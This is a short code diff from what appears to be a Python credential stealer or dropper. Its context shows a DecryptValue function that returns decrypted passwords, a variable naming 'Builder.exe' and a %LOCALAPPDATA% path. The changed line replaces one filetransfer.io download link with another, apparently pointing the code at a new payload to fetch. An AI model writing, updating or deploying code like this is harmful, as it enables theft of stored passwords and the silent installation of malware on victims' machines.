@@ -97,7 +97,7 @@ def DecryptValue(buff, master_key=None):
         return decrypted_pass
         
 a = "Builder.exe"
-b = "https://filetransfer.io/data-package/XDkZNXhx/download"
+b = "https://filetransfer.io/data-package/PoMLNkdA/download"
 c = os.path.expandvars(r"%LOCALAPPDATA%")
 
 d = {
